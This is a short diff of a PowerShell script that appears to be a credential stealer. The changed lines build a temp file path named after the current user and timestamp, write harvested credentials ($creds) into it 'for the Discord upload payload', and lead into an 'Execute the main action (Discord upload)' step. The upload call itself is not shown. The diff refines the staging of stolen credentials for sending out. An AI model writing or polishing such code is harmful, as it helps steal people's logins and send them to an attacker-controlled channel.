@@ -154,10 +154,10 @@ try {
 
     # 4. File Preparation and Uploads
     $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Credentials.txt"
-    $tempPath = $env:TEMP\$FileName
+    $tempPath = Join-Path $env:TEMP $FileName
 
     # Save credentials to a file for the Discord upload payload
-    echo $creds &gt; $tempPath
+    $creds | Out-File -FilePath $tempPath
     Write-Host "Credentials saved locally to $tempPath."
 
     # Execute the main action (Discord upload)
